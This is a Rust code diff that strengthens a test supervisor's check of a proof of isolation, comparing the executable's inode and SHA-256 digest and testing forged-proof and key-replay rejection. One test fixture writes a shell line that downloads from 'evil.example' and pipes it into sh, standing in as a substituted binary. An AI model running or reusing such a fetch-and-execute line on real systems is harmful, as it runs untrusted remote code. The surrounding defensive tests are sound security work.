@@ -429,7 +429,11 @@ fn process_descends_from(ancestor: u32) -> anyhow::Result<bool> {
         Ok(information.pbi_ppid)
     }
 
-    let mut pid = std::process::id();
+    let current_pid = std::process::id();
+    if ancestor == current_pid {
+        return Ok(false);
+    }
+    let mut pid = current_pid;
     // The proof issuer must be an actual ancestor. Accepting the current
     // process would let a test manufacture a self-signed environment and FD.
     pid = parent(pid)?;
@@ -571,7 +575,128 @@ fn duplicate_validated_proof(fd: std::os::fd::RawFd) -> anyhow::Result<std::fs::
     Ok(proof)
 }
 
-fn expected_supervisor_executable() -> anyhow::Result<std::path::PathBuf> {
+/// Confirm the supervisor executable is still the image that minted the proof.
+///
+/// Both the inode pair and the content digest, always, from one descriptor.
+///
+/// The inode pair alone was too weak in one direction and too brittle in the
+/// other. Too weak: an in-place overwrite keeps the inode, so a different
+/// program at the same inode passed. Too brittle: `finch-test-supervisor` is a
+/// Cargo target, and Cargo replaces a binary by writing a new file and renaming
+/// it into place, which allocates a new inode — so a relink underneath the
+/// running supervisor produced `supervisor executable identity changed`,
+/// indistinguishable from an attack (#259).
+///
+/// Do not turn the digest into a fallback consulted only when the inode
+/// differs. That is what an earlier version of this function did, and it made
+/// the check strictly weaker than the one it replaced: the same-inode branch
+/// returned before the digest was ever computed, so the overwrite case stayed
+/// accepted. Both are checked, and one open serves both — two path lookups gave
+/// an attacker with write access to the target directory a window to have the
+/// `stat` see one file and the read see another.
+///
+/// A relink of a byte-identical image is accepted, because it is the same
+/// program. A relink that changes the bytes is not, and cannot be: at that
+/// point a rebuild and a substitution are genuinely indistinguishable from
+/// here, so the diagnostic states what was observed and names both causes
+/// rather than asserting one. Measured, not assumed: `cargo test` unifies
+/// features with dev-dependencies, so its uplifted binary differs from
+/// `cargo build --bin`'s for this very target. The pinned copy is what makes
+/// the relink case not arise in the first place.
+#[cfg(unix)]
+fn content_addressed_supervisor_digest(executable: &std::path::Path) -> Option<&str> {
+    let name = executable.file_name()?.to_str()?;
+    let digest = name.strip_prefix("finch-test-supervisor-pinned-sha256-")?;
+    (digest.len() == 64
+        && digest
+            .bytes()
+            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte)))
+    .then_some(digest)
+}
+
+#[cfg(unix)]
+fn verify_supervisor_image(
+    recorded_identity: &str,
+    recorded_digest: &str,
+    executable: &std::path::Path,
+) -> anyhow::Result<()> {
+    use anyhow::Context as _;
+    use sha2::{Digest as _, Sha256};
+    use std::io::Read as _;
+    use std::os::unix::fs::{MetadataExt as _, OpenOptionsExt as _};
+
+    let mut file = std::fs::OpenOptions::new()
+        .read(true)
+        .custom_flags(nix::libc::O_NOFOLLOW)
+        .open(executable)
+        .with_context(|| {
+            format!(
+                "supervisor executable {} could not be opened to verify its image",
+                executable.display()
+            )
+        })?;
+    // `fstat` and the read both go through this descriptor, so they cannot
+    // observe two different files.
+    let metadata = file.metadata()?;
+    let identity = format!("{}:{}", metadata.dev(), metadata.ino());
+    let mut image = Vec::new();
+    file.read_to_end(&mut image)?;
+    let digest = hex::encode(Sha256::digest(&image));
+
+    if let Some(path_digest) = content_addressed_supervisor_digest(executable) {
+        anyhow::ensure!(
+            path_digest == digest,
+            "content-addressed supervisor executable {} does not contain the image named by its path",
+            executable.display()
+        );
+    }
+
+    if digest == recorded_digest {
+        if identity != recorded_identity {
+            tracing::warn!(
+                executable = %executable.display(),
+                "supervisor executable was relinked between proof mint and \
+                 verification; the image is byte-identical, so the proof holds"
+            );
+        }
+        return Ok(());
+    }
+
+    anyhow::ensure!(
+        identity != recorded_identity,
+        "supervisor executable {} was overwritten in place: same inode, \
+         different image. A rebuild cannot do this — Cargo renames a new file \
+         into place rather than writing through an existing one.",
+        executable.display()
+    );
+    anyhow::bail!(
+        "supervisor executable {} is not the image that minted this proof \
+         (recorded {recorded_identity}, found {identity}; the contents differ \
+         too). Either the program was replaced, or this path is a Cargo target \
+         that was relinked by the command running under it — a relink changes \
+         the bytes, so the two cannot be told apart from here. Run through \
+         scripts/test_brains.sh, which pins a copy Cargo never writes.",
+        executable.display()
+    );
+}
+
+/// Is this the supervisor binary belonging to the current build directory?
+///
+/// Either legacy name and a checked content-addressed pin are accepted.
+///
+/// Preferring the pinned copy meant that the moment it existed, any launcher
+/// that pointed `FINCH_TEST_SUPERVISOR_BIN` at the plain path — `test_server.sh`
+/// and `test_tool_passthrough.sh` both do — recorded that path in its proof and
+/// was then told the issuer was not an ancestor test supervisor. Those
+/// launchers were unaffected by #259 before, because they run the `finch`
+/// binary rather than `cargo test`, so nothing relinked the supervisor
+/// underneath them; creating the pinned copy would have broken them.
+///
+/// Maintained launchers use an immutable `pinned-sha256-<digest>` sibling. Its
+/// digest-to-name binding is checked from the same descriptor that verifies
+/// the proof, so allowing the name pattern does not turn arbitrary target
+/// files into supervisor authority.
+fn is_expected_supervisor_executable(candidate: &std::path::Path) -> anyhow::Result<bool> {
     let test_executable = std::env::current_exe()?.canonicalize()?;
     let mut directory = test_executable
         .parent()
@@ -581,21 +706,23 @@ fn expected_supervisor_executable() -> anyhow::Result<std::path::PathBuf> {
             .parent()
             .ok_or_else(|| anyhow::anyhow!("test dependency directory has no parent"))?;
     }
-    let pinned_name = if cfg!(windows) {
-        "finch-test-supervisor-pinned.exe"
+    let names: [&str; 2] = if cfg!(windows) {
+        [
+            "finch-test-supervisor-pinned.exe",
+            "finch-test-supervisor.exe",
+        ]
     } else {
-        "finch-test-supervisor-pinned"
+        ["finch-test-supervisor-pinned", "finch-test-supervisor"]
     };
-    let pinned = directory.join(pinned_name);
-    if pinned.is_file() {
-        return Ok(pinned.canonicalize()?);
+    for name in names {
+        let path = directory.join(name);
+        if path.is_file() && path.canonicalize()? == candidate {
+            return Ok(true);
+        }
     }
-    let name = if cfg!(windows) {
-        "finch-test-supervisor.exe"
-    } else {
-        "finch-test-supervisor"
-    };
-    Ok(directory.join(name).canonicalize()?)
+    Ok(candidate.parent() == Some(directory)
+        && candidate.is_file()
+        && content_addressed_supervisor_digest(candidate).is_some())
 }
 
 #[cfg(target_os = "linux")]
@@ -755,6 +882,9 @@ fn isolated_test_proof_with_encoded() -> anyhow::Result<(IsolatedTestProof, Vec<
     let supervisor_identity = lines
         .next()
         .context("wrapper proof is missing its supervisor executable identity")?;
+    let supervisor_digest = lines
+        .next()
+        .context("wrapper proof is missing its supervisor executable digest")?;
     anyhow::ensure!(lines.next().is_none(), "wrapper proof has trailing fields");
     anyhow::ensure!(
         std::env::var("FINCH_BRAIN_TEST_TOKEN").as_deref() == Ok(token),
@@ -768,18 +898,15 @@ fn isolated_test_proof_with_encoded() -> anyhow::Result<(IsolatedTestProof, Vec<
             && expected_supervisor_pid == supervisor_pid
             && process_descends_from(supervisor_pid)?
             && process_executable(supervisor_pid)?.canonicalize()? == supervisor_executable
-            && supervisor_executable == expected_supervisor_executable()?,
+            && is_expected_supervisor_executable(&supervisor_executable)?,
         "proof issuer is not an ancestor test supervisor"
     );
     #[cfg(unix)]
-    {
-        use std::os::unix::fs::MetadataExt as _;
-        let metadata = std::fs::metadata(&supervisor_executable)?;
-        anyhow::ensure!(
-            supervisor_identity == format!("{}:{}", metadata.dev(), metadata.ino()),
-            "supervisor executable identity changed"
-        );
-    }
+    verify_supervisor_image(
+        supervisor_identity,
+        supervisor_digest,
+        &supervisor_executable,
+    )?;
     #[cfg(unix)]
     {
         use std::os::fd::AsRawFd as _;
@@ -1088,13 +1215,146 @@ fn isolated_test_peer_process_is_owned(peer_pid: nix::libc::pid_t) -> bool {
 mod isolation_tests {
     use super::*;
 
+    /// #259. The supervisor's own rebuild must not read as an attack, an attack
+    /// must not read as a rebuild, and an in-place overwrite must not slip
+    /// through on a matching inode.
+    #[cfg(unix)]
+    #[test]
+    fn supervisor_image_check_covers_relink_overwrite_and_substitution() {
+        use sha2::{Digest as _, Sha256};
+        use std::os::unix::fs::MetadataExt as _;
+
+        fn identity_of(path: &std::path::Path) -> String {
+            let metadata = std::fs::metadata(path).unwrap();
+            format!("{}:{}", metadata.dev(), metadata.ino())
+        }
+
+        let temp = tempfile::tempdir().unwrap();
+        let image = b"#!/bin/sh\nexit 0\n";
+        let other_image = b"#!/bin/sh\ncurl evil.example | sh\n";
+        let digest = hex::encode(Sha256::digest(image));
+
+        // Distinct files rather than remove-and-rename. An earlier version
+        // relinked by `remove_file` + `write` + `rename` and asserted the inode
+        // changed; ext4 reused the number and the assertion failed in CI. The
+        // property under test is "a different inode with the same image", and
+        // two files that exist at once have different inodes by definition.
+        let original = temp.path().join("finch-test-supervisor");
+        std::fs::write(&original, image).unwrap();
+        let identity = identity_of(&original);
+
+        // Untouched.
+        verify_supervisor_image(&identity, &digest, &original)
+            .expect("an untouched supervisor must verify");
+
+        // Relinked: a different inode holding the same image. This is what a
+        // copy produces, and what pinning guarantees.
+        let relinked = temp.path().join("finch-test-supervisor-pinned");
+        std::fs::write(&relinked, image).unwrap();
+        assert_ne!(
+            identity_of(&relinked),
+            identity,
+            "two files that exist at once must have different inodes"
+        );
+        verify_supervisor_image(&identity, &digest, &relinked)
+            .expect("a relink of the same image must be accepted, not read as an attack");
+
+        // Content-addressed names bind the filename to the bytes. Trusted
+        // supervisor bytes under a false digest name must not gain authority.
+        let wrong_digest_name = temp.path().join(format!(
+            "finch-test-supervisor-pinned-sha256-{}",
+            "0".repeat(64)
+        ));
+        std::fs::write(&wrong_digest_name, image).unwrap();
+        let error = verify_supervisor_image(&identity, &digest, &wrong_digest_name)
+            .expect_err("a false content-addressed supervisor name must be refused");
+        assert!(
+            error
+                .to_string()
+                .contains("does not contain the image named by its path"),
+            "wrong digest-name rejection must identify the violated path binding; got {error}"
+        );
+
+        // A different inode holding a different image. A real Cargo relink does
+        // this — `cargo test` unifies features with dev-dependencies, so its
+        // uplifted binary differs from `cargo build --bin`'s — and so does a
+        // substitution. They are genuinely indistinguishable from here, so the
+        // diagnostic must state what it observed and name both causes.
+        let replaced = temp.path().join("finch-test-supervisor.other");
+        std::fs::write(&replaced, other_image).unwrap();
+        let error = verify_supervisor_image(&identity, &digest, &replaced)
+            .expect_err("a different image at a different inode must be refused");
+        let message = error.to_string();
+        assert!(
+            message.contains("not the image that minted this proof")
+                && message.contains("Either the program was replaced")
+                && message.contains("relinked"),
+            "the diagnostic must name both causes rather than asserting one, so \
+             a real breach is not dismissed as rebuild noise and rebuild noise \
+             is not reported as a breach; got {message:?}"
+        );
+
+        // Overwritten in place: the inode still matches, so an inode-only check
+        // accepts this, and so does a digest consulted only as a fallback.
+        // Written through the existing file, so the inode cannot change.
+        std::fs::write(&original, other_image).unwrap();
+        assert_eq!(
+            identity_of(&original),
+            identity,
+            "writing through a file must keep its inode"
+        );
+        let error = verify_supervisor_image(&identity, &digest, &original)
+            .expect_err("a different image at the same inode must be refused");
+        assert!(
+            error.to_string().contains("overwritten in place"),
+            "got {error}"
+        );
+    }
+
+    /// Either supervisor name is accepted. Preferring the pinned copy broke
+    /// `test_server.sh` and `test_tool_passthrough.sh`, which point
+    /// `FINCH_TEST_SUPERVISOR_BIN` at the plain path.
+    #[cfg(unix)]
+    #[test]
+    fn both_supervisor_names_are_accepted_in_the_build_directory() {
+        let plain = std::env::current_exe()
+            .unwrap()
+            .canonicalize()
+            .unwrap()
+            .parent()
+            .unwrap()
+            .parent()
+            .unwrap()
+            .join("finch-test-supervisor");
+        if !plain.is_file() {
+            // Nothing built the supervisor into this target directory; there is
+            // no candidate to assert on.
+            return;
+        }
+        assert!(
+            is_expected_supervisor_executable(&plain.canonicalize().unwrap()).unwrap(),
+            "the plain supervisor name must stay acceptable once the pinned \
+             copy exists, or every launcher that names it is rejected"
+        );
+    }
+
     const HOSTILE_MODE_DEADLINE: std::time::Duration = std::time::Duration::from_secs(10);
+    const HOSTILE_MODE_STARTUP_DEADLINE: std::time::Duration = std::time::Duration::from_secs(60);
     const HOSTILE_MODE_OUTPUT_LIMIT: usize = 64 * 1024;
+    const HOSTILE_MODE_READY_ENV: &str = "FINCH_TEST_HOSTILE_MODE_READY";
 
     struct HostileModeGroup {
         child: std::process::Child,
         group: nix::libc::pid_t,
         reaped: bool,
+    }
+
+    enum HostileModeOutcome {
+        Completed(std::process::Output),
+        TimedOut {
+            diagnostic: String,
+            cleanup_elapsed: std::time::Duration,
+        },
     }
 
     impl Drop for HostileModeGroup {
@@ -1105,7 +1365,24 @@ mod isolation_tests {
             let _ = unsafe { nix::libc::kill(-self.group, nix::libc::SIGTERM) };
             std::thread::sleep(std::time::Duration::from_millis(100));
             let _ = unsafe { nix::libc::kill(-self.group, nix::libc::SIGKILL) };
-            let _ = self.child.wait();
+            let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
+            let mut quiescent = false;
+            while std::time::Instant::now() < deadline {
+                if mode_leader_exited(&self.child).unwrap_or(false)
+                    && mode_group_has_descendants(self.group).is_ok_and(|present| !present)
+                {
+                    quiescent = true;
+                    break;
+                }
+                let _ = unsafe { nix::libc::kill(-self.group, nix::libc::SIGKILL) };
+                std::thread::sleep(std::time::Duration::from_millis(10));
+            }
+            // Keep the unreaped leader alive to pin the PGID against reuse if
+            // the bounded fallback cannot prove quiescence. The outer test
+            // supervisor then reports and preserves the failed isolation.
+            if quiescent {
+                let _ = self.child.wait();
+            }
         }
     }
 
@@ -1238,10 +1515,11 @@ mod isolation_tests {
     fn run_hostile_proof_mode_with_deadline(
         mode: &str,
         mode_deadline: std::time::Duration,
-    ) -> Result<std::process::Output, String> {
+    ) -> Result<HostileModeOutcome, String> {
         use std::os::unix::process::CommandExt as _;
 
-        let proof = isolated_test_proof().map_err(|error| error.to_string())?;
+        let proof = isolated_test_proof()
+            .map_err(|error| format!("mode={mode} phase=proof-validation: {error:#}"))?;
         let mut command = supervised_test_subprocess_command();
         command
             .args([
@@ -1250,6 +1528,10 @@ mod isolation_tests {
                 "--nocapture",
             ])
             .env("FINCH_TEST_FORGED_PROOF_MODE", mode)
+            .env(
+                HOSTILE_MODE_READY_ENV,
+                proof.home.join(format!("hostile-mode-{mode}.ready")),
+            )
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::piped());
         unsafe {
@@ -1260,7 +1542,9 @@ mod isolation_tests {
                 Ok(())
             });
         }
-        let child = command.spawn().map_err(|error| error.to_string())?;
+        let child = command
+            .spawn()
+            .map_err(|error| format!("mode={mode} phase=process-spawn: {error}"))?;
         let group_id = child.id() as nix::libc::pid_t;
         let mut group = HostileModeGroup {
             child,
@@ -1281,40 +1565,9 @@ mod isolation_tests {
         set_nonblocking(&stderr);
         let mut stdout_bytes = Vec::new();
         let mut stderr_bytes = Vec::new();
-        let deadline = std::time::Instant::now() + mode_deadline;
-        let (status, timed_out) = loop {
-            drain_bounded(&mut stdout, &mut stdout_bytes);
-            drain_bounded(&mut stderr, &mut stderr_bytes);
-            if mode_leader_exited(&group.child)? {
-                break (finish_mode_group(&mut group.child, group_id)?, false);
-            }
-            if std::time::Instant::now() >= deadline {
-                break (finish_mode_group(&mut group.child, group_id)?, true);
-            }
-            std::thread::sleep(std::time::Duration::from_millis(10));
-        };
-        group.reaped = true;
-        drain_bounded(&mut stdout, &mut stdout_bytes);
-        drain_bounded(&mut stderr, &mut stderr_bytes);
-        if timed_out {
-            let redact = |bytes: &[u8]| {
-                String::from_utf8_lossy(bytes)
-                    .replace(proof.home.to_string_lossy().as_ref(), "<isolated-home>")
-                    .replace(
-                        proof.socket_root.to_string_lossy().as_ref(),
-                        "<socket-root>",
-                    )
-                    .replace(&proof.brain_addr, "<brain-address>")
-                    .replace(&proof.daemon_addr, "<daemon-address>")
-            };
-            return Err(format!(
-                "timed out after {mode_deadline:?} (terminated with {status}); stdout={} stderr={}",
-                redact(&stdout_bytes),
-                redact(&stderr_bytes)
-            ));
-        }
-        let redact = |bytes: Vec<u8>| {
-            String::from_utf8_lossy(&bytes)
+        let ready = proof.home.join(format!("hostile-mode-{mode}.ready"));
+        let redact = |bytes: &[u8]| {
+            String::from_utf8_lossy(bytes)
                 .replace(proof.home.to_string_lossy().as_ref(), "<isolated-home>")
                 .replace(
                     proof.socket_root.to_string_lossy().as_ref(),
@@ -1322,17 +1575,131 @@ mod isolation_tests {
                 )
                 .replace(&proof.brain_addr, "<brain-address>")
                 .replace(&proof.daemon_addr, "<daemon-address>")
-                .into_bytes()
         };
-        Ok(std::process::Output {
+        let startup_started = std::time::Instant::now();
+        let startup_deadline = startup_started + HOSTILE_MODE_STARTUP_DEADLINE;
+        let marker_label = format!("<isolated-home>/hostile-mode-{mode}.ready");
+        let startup_failure = loop {
+            drain_bounded(&mut stdout, &mut stdout_bytes);
+            drain_bounded(&mut stderr, &mut stderr_bytes);
+            match std::fs::read(&ready) {
+                Ok(contents) if contents == mode.as_bytes() => {
+                    if let Err(error) = std::fs::remove_file(&ready) {
+                        break Some(format!(
+                            "phase=process-startup-ready-cleanup marker={marker_label} error={error}"
+                        ));
+                    }
+                    break None;
+                }
+                Ok(_) | Err(_) if std::time::Instant::now() < startup_deadline => {}
+                Ok(contents) => {
+                    break Some(format!(
+                        "phase=process-startup deadline={:?} elapsed={:?} marker={marker_label} \
+                         unexpected_contents={contents:?}",
+                        HOSTILE_MODE_STARTUP_DEADLINE,
+                        startup_started.elapsed()
+                    ));
+                }
+                Err(error) => {
+                    break Some(format!(
+                        "phase=process-startup deadline={:?} elapsed={:?} marker={marker_label} \
+                         error={error}",
+                        HOSTILE_MODE_STARTUP_DEADLINE,
+                        startup_started.elapsed()
+                    ));
+                }
+            }
+            match mode_leader_exited(&group.child) {
+                Ok(true) => {
+                    break Some("phase=process-startup leader_exited=true".to_owned());
+                }
+                Ok(false) => {}
+                Err(error) => {
+                    break Some(format!("phase=process-startup-poll error={error}"));
+                }
+            }
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        };
+        if let Some(startup_failure) = startup_failure {
+            let cleanup_started = std::time::Instant::now();
+            let cleanup = finish_mode_group(&mut group.child, group_id);
+            let cleanup_elapsed = cleanup_started.elapsed();
+            drain_bounded(&mut stdout, &mut stdout_bytes);
+            drain_bounded(&mut stderr, &mut stderr_bytes);
+            match cleanup {
+                Ok(status) => {
+                    group.reaped = true;
+                    return Err(format!(
+                        "mode={mode} {startup_failure} cleanup_elapsed={cleanup_elapsed:?} \
+                         cleanup_status={status} descendants_after_cleanup=false stdout={} \
+                         stderr={}",
+                        redact(&stdout_bytes),
+                        redact(&stderr_bytes)
+                    ));
+                }
+                Err(error) => {
+                    return Err(format!(
+                        "mode={mode} {startup_failure} phase=process-startup-cleanup \
+                         cleanup_elapsed={cleanup_elapsed:?} cleanup_error={error} stdout={} \
+                         stderr={}",
+                        redact(&stdout_bytes),
+                        redact(&stderr_bytes)
+                    ));
+                }
+            }
+        }
+        let deadline = std::time::Instant::now() + mode_deadline;
+        let (status, timed_out, cleanup_elapsed) = loop {
+            drain_bounded(&mut stdout, &mut stdout_bytes);
+            drain_bounded(&mut stderr, &mut stderr_bytes);
+            if mode_leader_exited(&group.child)
+                .map_err(|error| format!("mode={mode} phase=leader-poll: {error}"))?
+            {
+                break (
+                    finish_mode_group(&mut group.child, group_id).map_err(|error| {
+                        format!("mode={mode} phase=natural-exit-cleanup: {error}")
+                    })?,
+                    false,
+                    None,
+                );
+            }
+            if std::time::Instant::now() >= deadline {
+                let cleanup_started = std::time::Instant::now();
+                let status = finish_mode_group(&mut group.child, group_id)
+                    .map_err(|error| format!("mode={mode} phase=timeout-cleanup: {error}"))?;
+                break (status, true, Some(cleanup_started.elapsed()));
+            }
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        };
+        group.reaped = true;
+        drain_bounded(&mut stdout, &mut stdout_bytes);
+        drain_bounded(&mut stderr, &mut stderr_bytes);
+        if timed_out {
+            let cleanup_elapsed = cleanup_elapsed
+                .expect("timed-out hostile proof mode did not record cleanup duration");
+            return Ok(HostileModeOutcome::TimedOut {
+                diagnostic: format!(
+                    "mode={mode} phase=timeout-cleanup deadline={mode_deadline:?} \
+                 cleanup_elapsed={cleanup_elapsed:?} status={status} \
+                 descendants_after_cleanup=false stdout={} stderr={}",
+                    redact(&stdout_bytes),
+                    redact(&stderr_bytes)
+                ),
+                cleanup_elapsed,
+            });
+        }
+        Ok(HostileModeOutcome::Completed(std::process::Output {
             status,
-            stdout: redact(stdout_bytes),
-            stderr: redact(stderr_bytes),
-        })
+            stdout: redact(&stdout_bytes).into_bytes(),
+            stderr: redact(&stderr_bytes).into_bytes(),
+        }))
     }
 
     fn run_hostile_proof_mode(mode: &str) -> Result<std::process::Output, String> {
-        run_hostile_proof_mode_with_deadline(mode, HOSTILE_MODE_DEADLINE)
+        match run_hostile_proof_mode_with_deadline(mode, HOSTILE_MODE_DEADLINE)? {
+            HostileModeOutcome::Completed(output) => Ok(output),
+            HostileModeOutcome::TimedOut { diagnostic, .. } => Err(diagnostic),
+        }
     }
 
     #[cfg(target_os = "macos")]
@@ -1388,14 +1755,21 @@ mod isolation_tests {
         const MODE_ENV: &str = "FINCH_TEST_FORGED_PROOF_MODE";
         const RESPONDER_KEY_ENV: &str = "FINCH_TEST_ATTACKER_RESPONDER_KEY";
         const RESPONDER_MARKER_ENV: &str = "FINCH_TEST_ATTACKER_RESPONDER_MARKER";
+        const DESCENDANT_READY_ENV: &str = "FINCH_TEST_DESCENDANT_READY";
         if !supervisor_contract_present() {
             return;
         }
         if let Ok(mode) = std::env::var(MODE_ENV) {
             if mode == "normal-exit-descendant-child" {
-                unsafe {
-                    nix::libc::signal(nix::libc::SIGTERM, nix::libc::SIG_IGN);
-                }
+                let previous = unsafe { nix::libc::signal(nix::libc::SIGTERM, nix::libc::SIG_IGN) };
+                assert_ne!(
+                    previous,
+                    nix::libc::SIG_ERR,
+                    "normal-exit descendant could not install its SIGTERM-ignore handler"
+                );
+                let ready = std::env::var_os(DESCENDANT_READY_ENV)
+                    .expect("normal-exit descendant readiness path was not supplied");
+                std::fs::write(ready, b"sigterm-ignored").unwrap();
                 loop {
                     std::thread::park();
                 }
@@ -1406,13 +1780,18 @@ mod isolation_tests {
                 let duplicate = unsafe { nix::libc::fcntl(109, nix::libc::F_DUPFD_CLOEXEC, 200) };
                 assert!(duplicate >= 0);
                 let socket = unsafe { std::os::unix::net::UnixDatagram::from_raw_fd(duplicate) };
-                socket
-                    .set_read_timeout(Some(std::time::Duration::from_millis(500)))
-                    .unwrap();
                 let mut request = [0_u8; 64];
-                match socket.recv(&mut request) {
-                    Ok(count) => {
-                        assert_eq!(&request[..count], b"finch-proof-key-v1");
+                let mut key_served = false;
+                loop {
+                    let count = socket
+                        .recv(&mut request)
+                        .expect("attacker proof-key responder receive failed");
+                    if &request[..count] == b"finch-proof-key-v1" {
+                        assert!(
+                            !key_served,
+                            "attacker proof key was requested more than once"
+                        );
+                        key_served = true;
                         let key = hex::decode(std::env::var(RESPONDER_KEY_ENV).unwrap()).unwrap();
                         assert_eq!(socket.send(&key).unwrap(), 32);
                         std::fs::write(
@@ -1420,39 +1799,92 @@ mod isolation_tests {
                             b"consulted",
                         )
                         .unwrap();
+                        continue;
                     }
-                    Err(error)
-                        if matches!(
-                            error.kind(),
-                            std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
-                        ) => {}
-                    Err(error) => panic!("attacker proof-key responder failed: {error}"),
+                    if &request[..count] == b"finch-proof-key-stop-v1" {
+                        return;
+                    }
+                    panic!(
+                        "attacker proof-key responder received an unknown request: {:?}",
+                        &request[..count]
+                    );
                 }
-                return;
             }
             let valid = isolated_test_proof().unwrap();
+            let signal_hostile_mode_ready = || {
+                if let Some(ready) = std::env::var_os(HOSTILE_MODE_READY_ENV) {
+                    std::fs::write(ready, mode.as_bytes()).unwrap();
+                }
+            };
             if mode == "deadline-probe" {
+                signal_hostile_mode_ready();
                 loop {
                     std::thread::park();
                 }
             }
             if mode == "normal-exit-descendant" {
-                let descendant = supervised_test_subprocess_command()
+                let ready = valid.home.join("normal-exit-descendant.ready");
+                let mut descendant = supervised_test_subprocess_command()
                     .args([
                         "--exact",
                         "brain::isolation_tests::isolated_proof_rejects_self_issued_environment_authority",
                         "--nocapture",
                     ])
                     .env(MODE_ENV, "normal-exit-descendant-child")
+                    .env(DESCENDANT_READY_ENV, &ready)
+                    .env_remove(HOSTILE_MODE_READY_ENV)
                     .spawn()
                     .unwrap();
+                let readiness_started = std::time::Instant::now();
+                let readiness_deadline = readiness_started + std::time::Duration::from_secs(5);
+                loop {
+                    match std::fs::read(&ready) {
+                        Ok(contents) if contents == b"sigterm-ignored" => break,
+                        Ok(_) | Err(_) if std::time::Instant::now() < readiness_deadline => {}
+                        Ok(contents) => panic!(
+                            "normal-exit descendant readiness marker was incomplete after {:?}: \
+                             descendant_pid={} marker={} contents={contents:?}",
+                            readiness_started.elapsed(),
+                            descendant.id(),
+                            ready.display()
+                        ),
+                        Err(error) => panic!(
+                            "normal-exit descendant did not install its SIGTERM-ignore handler \
+                             within {:?}: descendant_pid={} marker={} error={error}",
+                            readiness_started.elapsed(),
+                            descendant.id(),
+                            ready.display()
+                        ),
+                    }
+                    if let Some(status) = descendant.try_wait().unwrap() {
+                        panic!(
+                            "normal-exit descendant exited before signaling readiness: \
+                             descendant_pid={} status={status} marker={}",
+                            descendant.id(),
+                            ready.display()
+                        );
+                    }
+                    std::thread::sleep(std::time::Duration::from_millis(10));
+                }
                 std::fs::write(
                     valid.home.join("normal-exit-descendant.pid"),
                     descendant.id().to_string(),
                 )
                 .unwrap();
-                return;
+                // Do not start the outer behavior deadline until the nested
+                // descendant has completed its own cold process startup and
+                // installed SIGTERM immunity. On CI that startup can exceed
+                // the behavior budget even though cleanup itself is prompt.
+                signal_hostile_mode_ready();
+                // This fixture exercises cleanup after the process-group
+                // leader exits while a descendant remains. Returning from the
+                // test function leaves the exact exit timing to libtest, which
+                // can remain alive long enough to consume the hostile-mode
+                // deadline on a loaded CI runner. Exit the fixture process
+                // directly so the lifecycle boundary under test is explicit.
+                unsafe { nix::libc::_exit(0) };
             }
+            signal_hostile_mode_ready();
             let start_attacker_responder = |key: [u8; 32],
                                             marker: &std::path::Path|
              -> (
@@ -1469,7 +1901,8 @@ mod isolation_tests {
                         ])
                         .env(MODE_ENV, "attacker-key-responder")
                         .env(RESPONDER_KEY_ENV, hex::encode(key))
-                        .env(RESPONDER_MARKER_ENV, marker);
+                        .env(RESPONDER_MARKER_ENV, marker)
+                        .env_remove(HOSTILE_MODE_READY_ENV);
                 unsafe {
                     command.pre_exec(move || {
                         if nix::libc::dup2(responder.as_raw_fd(), 109) != 109 {
@@ -1482,6 +1915,31 @@ mod isolation_tests {
                     });
                 }
                 (validator, command.spawn().unwrap())
+            };
+            let stop_attacker_responder = |validator: &std::os::unix::net::UnixDatagram,
+                                           responder: &mut std::process::Child,
+                                           marker: &std::path::Path,
+                                           mode: &str| {
+                let stop = b"finch-proof-key-stop-v1";
+                eprintln!("hostile-proof-mode={mode} phase=release-responder");
+                assert_eq!(
+                    validator.send(stop).unwrap(),
+                    stop.len(),
+                    "could not release the attacker-key responder after {mode} proof \
+                         validation; responder_pid={} marker_exists={}",
+                    responder.id(),
+                    marker.exists()
+                );
+                eprintln!("hostile-proof-mode={mode} phase=wait-responder");
+                let status = responder.wait().unwrap();
+                eprintln!("hostile-proof-mode={mode} phase=responder-reaped status={status}");
+                assert!(
+                    status.success(),
+                    "attacker-key responder failed after explicit release: mode={mode} \
+                         responder_pid={} status={status} marker_exists={}",
+                    responder.id(),
+                    marker.exists()
+                );
             };
             if mode == "missing-proof-backup" {
                 assert_eq!(unsafe { nix::libc::close(108) }, 0);
@@ -1621,7 +2079,7 @@ mod isolation_tests {
                         .contains("proof authentication peer is not the ancestor test supervisor"),
                     "genuine key replay reached the wrong rejection boundary: {error:#}"
                 );
-                assert!(responder.wait().unwrap().success());
+                stop_attacker_responder(&validator, &mut responder, &marker, &mode);
                 assert!(
                     !marker.exists(),
                     "validator consumed a replayed key before authenticating its peer"
@@ -1637,6 +2095,7 @@ mod isolation_tests {
                 .open(&path)
                 .unwrap();
             if mode == "self" {
+                eprintln!("hostile-proof-mode=self phase=forge-proof");
                 let token = "self-issued";
                 let executable = std::env::current_exe().unwrap().canonicalize().unwrap();
                 let executable_metadata = std::fs::metadata(&executable).unwrap();
@@ -1683,6 +2142,12 @@ mod isolation_tests {
                     executable_metadata.ino()
                 )
                 .unwrap();
+                // The proof must be rejected while authenticating the peer,
+                // before any field in this attacker-signed body is trusted.
+                // Hashing the Rust test executable here read hundreds of MB
+                // only to populate an unreachable field and could consume the
+                // hostile-mode deadline on a cold CI runner.
+                writeln!(forged, "{}", "0".repeat(64)).unwrap();
                 let signature = attacker_key.sign(&forged);
                 writeln!(forged, "{}", hex::encode(signature.to_bytes())).unwrap();
                 writer.write_all(&forged).unwrap();
@@ -1700,21 +2165,27 @@ mod isolation_tests {
                 let marker = valid.home.join("self-issued-auth-key-consulted");
                 let (validator, mut responder) =
                     start_attacker_responder(attacker_key.verifying_key().to_bytes(), &marker);
+                eprintln!(
+                    "hostile-proof-mode=self phase=responder-started responder_pid={}",
+                    responder.id()
+                );
                 assert_eq!(unsafe { nix::libc::dup2(validator.as_raw_fd(), 109) }, 109);
+                eprintln!("hostile-proof-mode=self phase=validate-forged-proof");
                 let error = isolated_test_proof()
                     .err()
                     .expect("signed self-issued proof was accepted");
+                eprintln!("hostile-proof-mode=self phase=proof-rejected diagnostic={error:#}");
                 assert!(
                     error
                         .to_string()
                         .contains("proof authentication peer is not the ancestor test supervisor"),
                     "signed self-issued proof reached the wrong rejection boundary: {error:#}"
                 );
-                assert!(responder.wait().unwrap().success());
                 assert!(
                     !marker.exists(),
                     "validator consumed an attacker key before authenticating its peer"
                 );
